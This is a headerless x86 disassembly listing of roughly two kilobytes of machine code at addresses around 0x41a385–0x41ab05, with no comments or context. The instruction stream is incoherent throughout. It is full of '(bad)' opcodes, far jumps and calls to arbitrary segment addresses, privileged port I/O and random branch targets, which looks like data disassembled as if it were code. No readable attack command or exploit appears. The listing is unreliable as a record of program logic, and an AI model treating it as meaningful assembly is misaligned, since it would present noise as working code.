  41a385:	sub    ebx,esi
  41a387:	inc    ebp
  41a388:	scas   al,BYTE PTR es:[edi]
  41a389:	cmp    al,0x3b
  41a38b:	or     eax,0x4a45e068
  41a390:	mov    ?,WORD PTR [esi+ecx*4-0x19]
  41a394:	add    edx,ebp
  41a396:	out    0x6b,eax
  41a398:	jle    0x41a34f
  41a39a:	aad    0x1b
  41a39c:	inc    esp
  41a39d:	fnsave [ecx+edx*2-0x36]
  41a3a1:	mov    WORD PTR [ebx-0x1b8b500a],?
  41a3a7:	dec    edx
  41a3a8:	mov    DWORD PTR ds:0x5285f2b3,ecx
  41a3ae:	dec    ecx
  41a3af:	fld    TBYTE PTR [ebp-0x54b27bd1]
  41a3b5:	repz pop esi
  41a3b7:	int    0xae
  41a3b9:	jb     0x41a35e
  41a3bb:	imul   DWORD PTR fs:[ebx]
  41a3be:	(bad)  
  41a3bf:	sbb    esi,DWORD PTR [edx-0x31942e68]
  41a3c5:	adc    al,0xd2
  41a3c7:	xlat   BYTE PTR ds:[ebx]
  41a3c8:	mov    al,ds:0x2f9b4343
  41a3cd:	push   ebp
  41a3ce:	pop    ds
  41a3cf:	pop    ebx
  41a3d0:	or     DWORD PTR [ebp+0x4c],ebx
  41a3d3:	jmp    0x41a41e
  41a3d5:	add    BYTE PTR [edi-0x24],ah
  41a3d8:	mov    ecx,0xcec051ef
  41a3dd:	fldl2t 
  41a3df:	push   eax
  41a3e0:	sub    edx,edi
  41a3e2:	ret    
  41a3e3:	mov    eax,ss
  41a3e5:	leave  
  41a3e6:	jmp    0x25fa:0x328bce6d
  41a3ed:	push   cs
  41a3ee:	(bad)  
  41a3ef:	sub    DWORD PTR [edx-0x15],ebx
  41a3f2:	retf   
  41a3f3:	pop    esp
  41a3f4:	jp     0x41a401
  41a3f6:	leave  
  41a3f7:	jmp    0x41a41b
  41a3f9:	pop    ebp
  41a3fa:	jmp    0x41a39c
  41a3fc:	xchg   ebp,eax
  41a3fd:	daa    
  41a3fe:	xchg   ebp,eax
  41a3ff:	xor    bl,BYTE PTR [edi-0x3c]
  41a402:	jo     0x41a44b
  41a404:	pusha  
  41a405:	inc    esi
  41a406:	test   DWORD PTR [edi],esi
  41a408:	xor    bh,BYTE PTR [ecx+0x69ceab97]
  41a40e:	xchg   esp,eax
  41a40f:	mov    ah,0x2d
  41a411:	fwait
  41a412:	sub    al,0x91
  41a414:	adc    edx,eax
  41a416:	xchg   ebx,eax
  41a417:	mov    bh,0xd7
  41a419:	jnp    0x41a39b
  41a41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a41c:	jne    0x41a3ed
  41a41e:	ins    BYTE PTR es:[edi],dx
  41a41f:	pop    ebx
  41a420:	inc    eax
  41a421:	xchg   edx,eax
  41a422:	ja     0x41a462
  41a424:	cs cmp eax,0x927fd11a
  41a42a:	outs   dx,DWORD PTR ds:[esi]
  41a42b:	cmp    ebx,0xffffffe9
  41a42e:	mov    bh,0x53
  41a430:	mov    DWORD PTR [edi+0x3c],0xf66c26fd
  41a437:	dec    ebx
  41a438:	dec    edx
  41a439:	jge    0x41a48e
  41a43b:	push   edx
  41a43c:	adc    al,0x8d
  41a43e:	jno    0x41a46b
  41a440:	push   es
  41a441:	repz dec ebp
  41a443:	icebp  
  41a444:	mov    edi,0x1c9163ab
  41a449:	loopne 0x41a49c
  41a44b:	or     dh,bl
  41a44d:	(bad)  
  41a44e:	rcl    BYTE PTR [eax+0x3a9d6799],1
  41a454:	sbb    al,0x28
  41a456:	leave  
  41a457:	inc    edi
  41a458:	cmp    DWORD PTR ds:0x727322ca,eax
  41a45e:	stos   DWORD PTR es:[edi],eax
  41a45f:	test   BYTE PTR [eax],ch
  41a461:	cs push cs
  41a463:	test   DWORD PTR [eax],esi
  41a465:	ins    BYTE PTR es:[edi],dx
  41a466:	sbb    eax,0xf3834604
  41a46b:	push   cs
  41a46c:	ins    DWORD PTR es:[edi],dx
  41a46d:	cmp    edx,DWORD PTR [eax-0x345f8833]
  41a473:	outs   dx,BYTE PTR ds:[esi]
  41a474:	retf   0xe046
  41a477:	arpl   WORD PTR ds:0x4ff2a818,sp
  41a47d:	mov    ah,0x98
  41a47f:	push   0xeb631297
  41a484:	push   eax
  41a485:	mov    ds:0x7dd808f8,eax
  41a48a:	popf   
  41a48b:	je     0x41a466
  41a48d:	or     BYTE PTR [ecx-0x73],bh
  41a490:	pusha  
  41a491:	pusha  
  41a492:	call   0xab3b:0xedba20f
  41a499:	jae    0x41a453
  41a49b:	pop    ecx
  41a49c:	jg     0x41a47b
  41a49e:	arpl   WORD PTR [edi-0x7ad7e4e5],sp
  41a4a4:	pop    eax
  41a4a5:	sub    eax,0x41eec0dc
  41a4aa:	mov    cl,BYTE PTR [edx+0x13d142b1]
  41a4b0:	adc    ch,BYTE PTR [ecx+0x364bdaef]
  41a4b6:	je     0x41a50d
  41a4b8:	mov    BYTE PTR [edi],ah
  41a4ba:	arpl   cx,dx
  41a4bc:	mov    BYTE PTR ss:[edx],al
  41a4bf:	mov    esi,DWORD PTR [edi+0x8]
  41a4c2:	xchg   edx,eax
  41a4c3:	lods   ax,WORD PTR ds:[esi]
  41a4c5:	sub    BYTE PTR ds:[ebx],cl
  41a4c8:	pop    esi
  41a4c9:	fwait
  41a4ca:	mov    es,WORD PTR [ebp-0x56]
  41a4cd:	lds    esp,FWORD PTR [eax-0x80]
  41a4d0:	dec    ecx
  41a4d1:	xor    eax,0x16bd7588
  41a4d6:	push   0xcebd45d8
  41a4db:	mov    eax,0x26c0da39
  41a4e0:	adc    ebx,DWORD PTR [edi-0x4e]
  41a4e3:	ja     0x41a4b3
  41a4e5:	cmp    eax,0xeb8bbda9
  41a4ea:	xchg   ebx,eax
  41a4eb:	and    cl,BYTE PTR [edi-0x26]
  41a4ee:	lock or DWORD PTR [esi-0x69],0x78
  41a4f3:	mov    ebx,0xb561981b
  41a4f8:	out    0xa9,eax
  41a4fa:	or     esp,ecx
  41a4fc:	into   
  41a4fd:	push   edi
  41a4fe:	jge    0x41a4d9
  41a500:	mov    ebx,DWORD PTR [ecx]
  41a502:	adc    eax,0x3594dc59
  41a507:	xchg   esp,eax
  41a508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a509:	xor    ch,ch
  41a50b:	repz loope 0x41a492
  41a50e:	retf   
  41a50f:	dec    ebx
  41a510:	ins    DWORD PTR es:[edi],dx
  41a511:	push   eax
  41a512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a513:	lods   eax,DWORD PTR ds:[esi]
  41a514:	pop    ebp
  41a515:	int3   
  41a516:	(bad)  
  41a517:	mov    ch,0xc8
  41a519:	jmp    0x41a4b2
  41a51b:	xor    DWORD PTR [ebx-0x4de92768],0xfffffff7
  41a522:	ror    DWORD PTR [ecx+0x6b],1
  41a525:	dec    ebx
  41a526:	push   edx
  41a527:	and    edi,ecx
  41a529:	mov    eax,DWORD PTR fs:[ebp+0x6f]
  41a52d:	push   es
  41a52e:	out    dx,eax
  41a52f:	dec    ebp
  41a530:	push   edi
  41a531:	and    al,0x52
  41a533:	ja     0x41a4f9
  41a535:	neg    edx
  41a537:	pop    ebx
  41a538:	sbb    al,0x9
  41a53a:	jmp    0x2cfead9d
  41a53f:	cli    
  41a540:	addr16 (bad) 
  41a543:	mov    al,ds:0xba915ba9
  41a548:	in     eax,0x71
  41a54a:	lds    eax,FWORD PTR [edx+0x48ea057b]
  41a550:	sub    edx,DWORD PTR [eax+ebx*1+0x3]
  41a554:	jae    0x41a4ef
  41a556:	in     al,0x82
  41a558:	xchg   ah,bl
  41a55a:	and    dl,BYTE PTR [edx-0x46]
  41a55d:	and    eax,0xb5d75494
  41a562:	jns    0x41a4ff
  41a564:	mov    bl,0x35
  41a566:	(bad)  
  41a567:	adc    eax,0xe9ad9800
  41a56c:	adc    dh,al
  41a56e:	push   es
  41a56f:	lods   eax,DWORD PTR ds:[esi]
  41a570:	pushf  
  41a571:	clc    
  41a572:	mov    dh,0x75
  41a574:	call   0xa0b3b6a7
  41a579:	cmp    edx,eax
  41a57b:	mov    ecx,0xfb179704
  41a580:	je     0x41a5ad
  41a582:	aad    0x7a
  41a584:	jle    0x41a57e
  41a586:	pop    ecx
  41a587:	sub    DWORD PTR [edx+0xa],esi
  41a58a:	and    bh,cl
  41a58c:	pusha  
  41a58d:	xor    al,ah
  41a58f:	xor    al,0xd8
  41a591:	sub    eax,0xd79a1223
  41a596:	mov    eax,ds:0xbd1c8f49
  41a59b:	sbb    esp,DWORD PTR [edx-0x6f43974d]
  41a5a1:	loop   0x41a5c2
  41a5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5a4:	adc    bl,BYTE PTR [eax+0x3c53dc16]
  41a5aa:	xchg   esi,eax
  41a5ab:	or     DWORD PTR [edi],edi
  41a5ad:	das    
  41a5ae:	mov    al,ds:0xeb5c8a2a
  41a5b3:	xor    ch,BYTE PTR ds:0x4572d5aa
  41a5b9:	popf   
  41a5ba:	mov    bh,al
  41a5bc:	imul   ebp,DWORD PTR [ebx+0x5a6027d7],0xffffffa2
  41a5c3:	(bad)  
  41a5c4:	fisubr DWORD PTR [edi+edx*2]
  41a5c7:	stc    
  41a5c8:	xchg   edi,eax
  41a5c9:	fidiv  DWORD PTR [esi]
  41a5cb:	mov    esp,0x38f51300
  41a5d0:	add    DWORD PTR [ebp+0x54],ecx
  41a5d3:	mov    ebx,0xdd850e12
  41a5d8:	cs pop ss
  41a5da:	pop    esi
  41a5db:	xchg   esi,eax
  41a5dc:	rcr    cl,cl
  41a5de:	icebp  
  41a5df:	and    eax,0x591cceb
  41a5e4:	push   0xffffffa4
  41a5e6:	call   0x9fbdeb34
  41a5eb:	iret   
  41a5ec:	js     0x41a57f
  41a5ee:	or     DWORD PTR [edi+ecx*1],edi
  41a5f1:	(bad)  
  41a5f2:	jmp    0x41a5d7
  41a5f4:	ret    0xb0ef
  41a5f7:	adc    al,0xcb
  41a5f9:	or     dl,bl
  41a5fb:	sbb    al,0x1c
  41a5fd:	imul   ebp,eax,0x19
  41a600:	pop    es
  41a601:	hlt    
  41a602:	xor    eax,0x30e462b0
  41a607:	std    
  41a608:	sbb    eax,0xa02fed6d
  41a60d:	(bad)  
  41a60e:	jbe    0x41a5ea
  41a610:	push   edi
  41a611:	(bad)  
  41a612:	int    0x48
  41a614:	jecxz  0x41a628
  41a616:	cld    
  41a617:	adc    eax,0x52ef52e1
  41a61c:	in     eax,dx
  41a61d:	cdq    
  41a61e:	mov    dh,0x89
  41a620:	enter  0x2bf,0x6e
  41a624:	fwait
  41a625:	js     0x41a605
  41a627:	or     eax,DWORD PTR [edi]
  41a629:	and    cl,dh
  41a62b:	lods   al,BYTE PTR ds:[esi]
  41a62c:	and    BYTE PTR [edx-0x360cc6c4],bh
  41a632:	out    dx,al
  41a633:	xlat   BYTE PTR ds:[ebx]
  41a634:	mov    eax,ds:0x42907b8e
  41a639:	jbe    0x41a5eb
  41a63b:	sar    DWORD PTR [ecx+0x26f655b3],1
  41a641:	mov    ecx,0xf38de60e
  41a646:	mov    ebx,0xca7404b6
  41a64b:	fwait
  41a64c:	xor    esp,DWORD PTR [edi-0x4a26803e]
  41a652:	mov    esi,esp
  41a654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a655:	addr16 pop edx
  41a657:	and    eax,DWORD PTR [eax+0x3bea54bb]
  41a65d:	outs   dx,DWORD PTR ds:[esi]
  41a65e:	jg     0x41a61d
  41a660:	dec    esi
  41a661:	lods   al,BYTE PTR ds:[esi]
  41a662:	pop    ebp
  41a663:	dec    esp
  41a664:	aaa    
  41a665:	cmp    DWORD PTR [eax+0x1e],ecx
  41a668:	pop    ebx
  41a669:	dec    ebp
  41a66a:	mul    DWORD PTR [esi-0x3d]
  41a66d:	jmp    0x4813:0xe3f7a2f
  41a674:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a676:	adc    ebx,edx
  41a678:	loope  0x41a64c
  41a67a:	js     0x41a665
  41a67c:	xor    eax,0xcdef892e
  41a681:	mov    ds:0xd19041e1,eax
  41a686:	(bad)  [ebp+0x2f4172cf]
  41a68c:	stos   BYTE PTR es:[edi],al
  41a68d:	push   esp
  41a68e:	into   
  41a68f:	push   0x52
  41a691:	xchg   edx,ebp
  41a693:	dec    eax
  41a694:	(bad)  
  41a695:	cmp    al,0x44
  41a697:	mov    ecx,0xacc3369e
  41a69c:	pop    ds
  41a69d:	js     0x41a622
  41a69f:	loope  0x41a6f9
  41a6a1:	xor    eax,0xfca6c13a
  41a6a6:	stos   DWORD PTR es:[edi],eax
  41a6a7:	ret    0xb376
  41a6aa:	mov    fs,esp
  41a6ac:	frstor [ebp+eax*8+0x3f]
  41a6b0:	xor    DWORD PTR [ebp-0x4a],0x2611821f
  41a6b7:	cmp    eax,0x84707328
  41a6bc:	cmc    
  41a6bd:	inc    edx
  41a6be:	cli    
  41a6bf:	jmp    0x74d26c1d
  41a6c4:	cmp    DWORD PTR [eax],0xffffffcf
  41a6c7:	push   edi
  41a6c8:	mov    BYTE PTR [edx-0x2],bh
  41a6cb:	call   0x9f7e:0x766faf27
  41a6d2:	sub    DWORD PTR [edi-0x2cfb28af],esp
  41a6d8:	mov    bl,0x0
  41a6da:	imul   edx,DWORD PTR [ecx-0x5a],0xd89cb9f4
  41a6e1:	rcr    DWORD PTR [esi-0x29efc5b4],1
  41a6e7:	ins    DWORD PTR es:[edi],dx
  41a6e8:	mov    cl,0x27
  41a6ea:	shl    ecx,0x25
  41a6ed:	punpckldq mm4,DWORD PTR [eax+0x68b90997]
  41a6f4:	fnstenv [esi-0x27eb1180]
  41a6fa:	out    0xa3,al
  41a6fc:	cmp    al,0x1b
  41a6fe:	arpl   WORD PTR [edi],bp
  41a700:	xchg   ecx,eax
  41a701:	xchg   DWORD PTR [edi+0xa01ae12],eax
  41a707:	and    al,0xed
  41a709:	mov    ch,BYTE PTR [ebx-0x6f]
  41a70c:	outs   dx,BYTE PTR ds:[esi]
  41a70d:	leave  
  41a70e:	sti    
  41a70f:	(bad)  
  41a710:	call   0xabd3:0x922884b1
  41a717:	in     al,0xdf
  41a719:	mov    ds:0x5521ec1d,al
  41a71e:	sub    eax,0x940d9e34
  41a723:	arpl   WORD PTR [ecx+0x5a],bp
  41a726:	push   esi
  41a727:	inc    eax
  41a728:	inc    ebp
  41a729:	test   DWORD PTR [ecx],esi
  41a72b:	icebp  
  41a72c:	rol    DWORD PTR [eax+0x15897594],cl
  41a732:	fabs   
  41a734:	add    eax,ebx
  41a736:	pop    esp
  41a737:	scas   al,BYTE PTR es:[edi]
  41a738:	imul   BYTE PTR [esi+0x4c6b94c4]
  41a73e:	aaa    
  41a73f:	js     0x41a771
  41a741:	dec    eax
  41a742:	push   0x53
  41a744:	and    ch,BYTE PTR [ebx+0x633a98b7]
  41a74a:	mov    ebp,0x6e59ed5b
  41a74f:	push   eax
  41a750:	daa    
  41a751:	mov    ebx,0xeb16be8c
  41a756:	int    0x2f
  41a758:	xor    eax,0x4baa9e20
  41a75d:	imul   DWORD PTR [ecx-0x6]
  41a760:	es scas eax,DWORD PTR es:[edi]
  41a762:	dec    ebp
  41a763:	pop    edi
  41a764:	adc    ch,BYTE PTR [eax]
  41a766:	mov    dl,0x7e
  41a768:	sbb    al,0xcb
  41a76a:	mov    eax,ds:0xa3518979
  41a76f:	retf   0x56db
  41a772:	jno    0x41a789
  41a774:	sahf   
  41a775:	sbb    dh,BYTE PTR [ebp-0x63]
  41a778:	and    edx,DWORD PTR [eax-0x1]
  41a77b:	add    BYTE PTR [esi-0x19],al
  41a77e:	or     eax,0x8e803745
  41a783:	mov    eax,ds:0xbbb55b1e
  41a788:	clc    
  41a789:	stos   BYTE PTR es:[edi],al
  41a78a:	mov    ds:0x5afc79e8,al
  41a78f:	add    dl,BYTE PTR [eax-0x106c9ead]
  41a795:	in     al,dx
  41a796:	push   esi
  41a797:	in     eax,0x3a
  41a799:	shr    BYTE PTR [edx+0x52],cl
  41a79c:	adc    DWORD PTR [esp+ebx*4-0x578806d7],eax
  41a7a3:	xchg   ecx,eax
  41a7a4:	ja     0x41a7fd
  41a7a6:	sti    
  41a7a7:	call   0xf4388604
  41a7ac:	sbb    al,0x89
  41a7ae:	mov    ds:0x8a7f1f16,eax
  41a7b3:	cmp    DWORD PTR [ebp+0xb],edi
  41a7b6:	push   edi
  41a7b7:	sub    esp,DWORD PTR ss:[ecx-0x258de58b]
  41a7be:	jmp    0x1464d39b
  41a7c3:	out    dx,eax
  41a7c4:	jno    0x41a7f6
  41a7c6:	iret   
  41a7c7:	fild   WORD PTR [eax-0x12]
  41a7ca:	in     al,0x20
  41a7cc:	rol    BYTE PTR [ebx+0x35],1
  41a7cf:	add    esi,DWORD PTR gs:[edi]
  41a7d2:	xlat   BYTE PTR ds:[ebx]
  41a7d3:	sbb    bl,BYTE PTR [eax]
  41a7d5:	ds sbb eax,0x9ecfe59f
  41a7db:	retf   
  41a7dc:	cs inc ebp
  41a7de:	dec    ebx
  41a7df:	push   edx
  41a7e0:	pop    esp
  41a7e1:	lods   al,BYTE PTR ds:[esi]
  41a7e2:	les    ecx,FWORD PTR [edi-0x7]
  41a7e5:	or     ch,BYTE PTR [edi-0x3419e3f5]
  41a7eb:	lahf   
  41a7ec:	cmp    al,0x1c
  41a7ee:	mov    ebx,esi
  41a7f0:	and    DWORD PTR [ebp+ecx*1-0x5d0c2832],ecx
  41a7f7:	and    BYTE PTR [ebp-0x537c6b79],ah
  41a7fd:	(bad)  
  41a7fe:	fdivrp st(0),st
  41a800:	mov    ds,esi
  41a802:	enter  0x1c28,0x81
  41a806:	xchg   ebx,eax
  41a807:	mov    esp,0xa5c639fd
  41a80c:	sbb    eax,0xc761cef4
  41a811:	or     al,0x17
  41a813:	retf   0xad60
  41a816:	mov    cl,0xc4
  41a818:	sti    
  41a819:	fisttp QWORD PTR [ebx]
  41a81b:	xchg   ebp,eax
  41a81c:	maxps  xmm6,XMMWORD PTR [edx-0x1f]
  41a820:	fmul   st,st(2)
  41a822:	hlt    
  41a823:	popf   
  41a824:	stos   BYTE PTR es:[edi],al
  41a825:	aam    0x80
  41a827:	iret   
  41a828:	imul   BYTE PTR [edi+edi*2+0x46021382]
  41a82f:	fisubr DWORD PTR [eax-0x10]
  41a832:	push   ebx
  41a833:	gs inc ebx
  41a835:	dec    esp
  41a836:	and    DWORD PTR [edx-0x47db6327],esi
  41a83c:	sub    eax,0x5980bcd8
  41a841:	mov    esi,0x1b864193
  41a846:	jecxz  0x41a809
  41a848:	data16 jle 0x41a81c
  41a84b:	addr16 mov ah,0x98
  41a84e:	add    bl,cl
  41a850:	sbb    BYTE PTR [eax+ecx*8-0x7a87f595],dl
  41a857:	adc    DWORD PTR [eax],ebx
  41a859:	or     esp,DWORD PTR [ecx]
  41a85b:	add    eax,0xbeee6d27
  41a860:	dec    eax
  41a861:	jbe    0x41a86b
  41a863:	mov    ah,BYTE PTR [eax]
  41a865:	dec    ebp
  41a866:	inc    esi
  41a867:	lds    esp,FWORD PTR [ecx+0x66d81a69]
  41a86d:	xor    ecx,DWORD PTR [esi-0x19]
  41a870:	out    dx,al
  41a871:	sub    ch,BYTE PTR [ebx-0x6c]
  41a874:	mul    edi
  41a876:	dec    ecx
  41a877:	fadd   DWORD PTR [ebp-0x1dca8861]
  41a87d:	test   al,0xb9
  41a87f:	ins    BYTE PTR es:[edi],dx
  41a880:	fnstcw WORD PTR ss:[edx+ecx*4+0xe]
  41a885:	sti    
  41a886:	push   0xffffffc2
  41a888:	stos   BYTE PTR es:[edi],al
  41a889:	sub    eax,0xa051261f
  41a88e:	je     0x41a8e1
  41a890:	daa    
  41a891:	inc    edi
  41a892:	pop    ds
  41a893:	push   ds
  41a894:	repz dec eax
  41a896:	das    
  41a897:	lods   eax,DWORD PTR ds:[esi]
  41a898:	jp     0x41a88f
  41a89a:	add    dl,0x63
  41a89d:	jmp    0x7c0:0xfaafffa4
  41a8a4:	call   0xf00f:0xb1a380fc
  41a8ab:	dec    ecx
  41a8ac:	ja     0x41a832
  41a8ae:	push   edi
  41a8af:	lods   eax,DWORD PTR ds:[esi]
  41a8b0:	into   
  41a8b1:	dec    edi
  41a8b2:	sbb    al,BYTE PTR [edi+0x36]
  41a8b5:	imul   edi,DWORD PTR [ebx],0x427662d0
  41a8bb:	loop   0x41a8de
  41a8bd:	(bad)  [esi+eax*2]
  41a8c0:	add    eax,0xa1d14a06
  41a8c5:	stc    
  41a8c6:	mov    edi,edx
  41a8c8:	jmp    0x473b:0x27ca80f5
  41a8cf:	frstor [edi+edi*2]
  41a8d2:	xchg   edx,eax
  41a8d3:	mov    ch,0x95
  41a8d5:	pop    ds
  41a8d6:	jbe    0x41a88d
  41a8d8:	aam    0xcc
  41a8da:	sahf   
  41a8db:	pop    eax
  41a8dc:	xchg   edi,eax
  41a8dd:	jp     0x41a888
  41a8df:	lahf   
  41a8e0:	xor    DWORD PTR [ebx-0x71],ebp
  41a8e3:	mov    eax,ds:0xf61800e2
  41a8e8:	je     0x41a893
  41a8ea:	cmc    
  41a8eb:	cmp    al,0xb2
  41a8ed:	mov    bh,0x85
  41a8ef:	xchg   DWORD PTR [eax+0x4f3ac700],ebx
  41a8f5:	inc    eax
  41a8f6:	cmp    al,0xed
  41a8f8:	adc    DWORD PTR [edi+0x4aa0079],esp
  41a8fe:	(bad)  
  41a8ff:	int3   
  41a900:	push   edx
  41a901:	iret   
  41a902:	xchg   DWORD PTR [eax+0x198f6e7b],ecx
  41a908:	(bad)  
  41a909:	lahf   
  41a90a:	aaa    
  41a90b:	fisttp WORD PTR [eax+0x39]
  41a90e:	inc    edx
  41a90f:	bnd call 0x9a31e726
  41a915:	fdiv   QWORD PTR [ecx+0x68]
  41a918:	xchg   edi,eax
  41a919:	jb     0x41a945
  41a91b:	es nop
  41a91d:	dec    ebx
  41a91e:	pop    ebp
  41a920:	cdq    
  41a921:	(bad)  
  41a922:	mov    al,0xee
  41a924:	mov    dl,0x16
  41a926:	inc    esi
  41a927:	mov    esi,0xc5867808
  41a92c:	push   0x316a2ca2
  41a931:	shl    ebx,cl
  41a933:	mov    cl,0xe9
  41a935:	or     esi,DWORD PTR [ebx+0xf545224]
  41a93b:	scas   al,BYTE PTR es:[edi]
  41a93c:	or     eax,0x8bb5f9bf
  41a941:	inc    edx
  41a942:	or     eax,0xb029d6d6
  41a947:	jge    0x41a905
  41a949:	out    dx,eax
  41a94a:	jns    0x41a950
  41a94c:	push   0xffffffa8
  41a94e:	in     al,0x26
  41a950:	loope  0x41a916
  41a952:	mov    al,ds:0xf1c90344
  41a957:	add    dl,BYTE PTR [eax]
  41a959:	mov    es,WORD PTR [esi+eiz*4]
  41a95c:	and    ch,dl
  41a95e:	dec    eax
  41a95f:	retf   
  41a960:	inc    eax
  41a961:	pusha  
  41a962:	ins    DWORD PTR es:[edi],dx
  41a963:	xchg   ebp,eax
  41a964:	push   0x3722ef38
  41a969:	adc    al,0x69
  41a96b:	das    
  41a96c:	retf   
  41a96d:	call   0x9f9f:0x7e39a650
  41a974:	aam    0x16
  41a976:	mov    ecx,0xf5f73865
  41a97b:	rcr    BYTE PTR [ebx],1
  41a97d:	cmp    DWORD PTR [eax-0x46ae0a35],edi
  41a983:	jmp    0xb173:0xedd644e3
  41a98a:	fsub   QWORD PTR ds:0x65ce4a20
  41a990:	ret    
  41a991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a992:	cmp    eax,0xd05dab68
  41a997:	je     0x41a947
  41a999:	(bad)  
  41a99a:	loopne 0x41a995
  41a99c:	enter  0x9501,0xf5
  41a9a0:	mov    al,0x4b
  41a9a2:	jns    0x41a9ee
  41a9a4:	xchg   dh,bl
  41a9a6:	xchg   ebp,eax
  41a9a7:	out    0x76,al
  41a9a9:	lods   al,BYTE PTR ds:[esi]
  41a9aa:	(bad)  
  41a9ab:	lock push edx
  41a9ad:	out    dx,al
  41a9ae:	push   0x6e
  41a9b0:	and    al,0xff
  41a9b2:	ins    DWORD PTR es:[edi],dx
  41a9b3:	mov    ch,0x55
  41a9b5:	rol    DWORD PTR [ebp-0x37],cl
  41a9b8:	sti    
  41a9b9:	push   0xfffffffb
  41a9bb:	js     0x41a9c4
  41a9bd:	pop    edx
  41a9be:	sub    ecx,DWORD PTR [edi+0x55]
  41a9c1:	stos   BYTE PTR es:[edi],al
  41a9c2:	cli    
  41a9c3:	jno    0x41a9e6
  41a9c5:	pop    edi
  41a9c6:	xchg   ebp,eax
  41a9c7:	add    dl,BYTE PTR [edi]
  41a9c9:	ins    BYTE PTR es:[edi],dx
  41a9ca:	addr16 enter 0xe7ea,0x8a
  41a9cf:	test   edx,ebx
  41a9d1:	in     eax,dx
  41a9d2:	popa   
  41a9d3:	push   cs
  41a9d4:	les    ebp,FWORD PTR [eax+edx*4]
  41a9d7:	repnz fsub QWORD PTR [edi+edi*2]
  41a9db:	push   ebp
  41a9dc:	jne    0x41a970
  41a9de:	xor    al,0x1a
  41a9e0:	mov    al,BYTE PTR [di]
  41a9e3:	fild   WORD PTR [eax+0x19]
  41a9e6:	mov    ebx,0x1b684ac9
  41a9eb:	mov    esp,0x941f6fae
  41a9f0:	sub    al,0xf2
  41a9f2:	popa   
  41a9f3:	cli    
  41a9f4:	fwait
  41a9f5:	imul   ebp,DWORD PTR [eax+0x788f338],0x423b09c2
  41a9ff:	jns    0x41a9eb
  41aa01:	aas    
  41aa02:	push   eax
  41aa03:	sbb    al,0xb5
  41aa05:	xchg   DWORD PTR [ebx-0x3be6c93b],eax
  41aa0b:	mov    edi,0x3505bc1b
  41aa10:	xor    eax,0x14b0bdd6
  41aa15:	gs retf 0x2fef
  41aa19:	jns    0x41aa50
  41aa1b:	cs push ebx
  41aa1d:	cdq    
  41aa1e:	push   esp
  41aa1f:	jg     0x41aa14
  41aa21:	mov    WORD PTR [edx],fs
  41aa23:	xor    al,0xe
  41aa25:	push   es
  41aa26:	pushf  
  41aa27:	xchg   edx,eax
  41aa28:	push   ds
  41aa29:	mov    ah,BYTE PTR [eax+0xb]
  41aa2c:	loopne 0x41aa18
  41aa2e:	jae    0x41aa52
  41aa30:	stc    
  41aa31:	push   edi
  41aa32:	xchg   DWORD PTR [esi-0x588d7324],edi
  41aa38:	lds    ebx,FWORD PTR [ebx]
  41aa3a:	adc    dl,bh
  41aa3c:	adc    ebp,DWORD PTR [ecx+edx*1]
  41aa3f:	(bad)  
  41aa40:	cmp    DWORD PTR [ebp+0xe],ecx
  41aa43:	repz lock inc esi
  41aa46:	add    esi,DWORD PTR [ecx]
  41aa48:	sub    esi,DWORD PTR [ebx]
  41aa4a:	imul   esi,ebx,0x71
  41aa4d:	in     eax,0x28
  41aa4f:	in     eax,dx
  41aa50:	sti    
  41aa51:	shl    BYTE PTR [esi],cl
  41aa53:	jecxz  0x41aa18
  41aa55:	js     0x41aac6
  41aa57:	mov    BYTE PTR [ebx+0x3da5408],al
  41aa5d:	das    
  41aa5e:	popf   
  41aa5f:	and    al,0xf5
  41aa61:	add    cl,BYTE PTR [ebx-0x72620efb]
  41aa67:	popa   
  41aa68:	adc    eax,0xa1d3edf1
  41aa6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa6e:	sbb    eax,0xa92a7a30
  41aa73:	scas   al,BYTE PTR es:[edi]
  41aa74:	popa   
  41aa75:	icebp  
  41aa76:	in     eax,0xb7
  41aa78:	add    DWORD PTR [ecx+ecx*4+0x224193ac],eax
  41aa7f:	mov    edi,0xdcbf8d25
  41aa84:	or     esi,DWORD PTR [ecx]
  41aa86:	jle    0x41aab8
  41aa88:	add    cl,ch
  41aa8a:	leave  
  41aa8b:	not    eax
  41aa8d:	imul   ecx,DWORD PTR [eax-0x651e9e87],0x7c
  41aa94:	pusha  
  41aa95:	adc    ecx,DWORD PTR ds:0x65d7c1b8
  41aa9b:	and    ch,ah
  41aa9d:	addr16 popf 
  41aa9f:	in     eax,0xa8
  41aaa1:	inc    eax
  41aaa2:	jmp    0xea78bc1c
  41aaa7:	ret    
  41aaa8:	inc    esi
  41aaa9:	push   esi
  41aaaa:	push   esp
  41aaab:	cmp    al,0xc7
  41aaad:	and    al,0x25
  41aaaf:	xchg   edi,eax
  41aab0:	fs cmp al,0x16
  41aab3:	fs mov eax,0x585a6c0a
  41aab9:	mov    edx,0x5db06ecd
  41aabe:	push   ebp
  41aabf:	js     0x41ab35
  41aac1:	in     al,dx
  41aac2:	pop    ds
  41aac3:	idiv   DWORD PTR ds:0x16bb496a
  41aac9:	dec    eax
  41aaca:	shr    bl,1
  41aacc:	jnp    0x41ab0b
  41aace:	cdq    
  41aacf:	sub    dl,0xfc
  41aad2:	out    dx,al
  41aad3:	xor    dh,dl
  41aad5:	jne    0x41ab23
  41aad7:	pusha  
  41aad8:	(bad)
  41aadc:	ret    0xe80f
  41aadf:	aad    0xba
  41aae1:	sti    
  41aae2:	fstp   DWORD PTR [esi]
  41aae4:	add    eax,0x23fd3fa
  41aae9:	dec    ecx
  41aaea:	arpl   sp,sp
  41aaec:	push   edx
  41aaed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaee:	imul   edi,DWORD PTR [edi+0x67],0xffffff96
  41aaf2:	ja     0x41aabd
  41aaf4:	scas   eax,DWORD PTR es:[edi]
  41aaf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaf6:	es push eax
  41aaf8:	stos   DWORD PTR es:[edi],eax
  41aaf9:	xchg   esi,eax
  41aafa:	aas    
  41aafb:	push   ebp
  41aafc:	add    eax,0x7119be40
  41ab01:	or     al,0xff
  41ab03:	mov    ch,0x85
  41ab05:	dec    esp
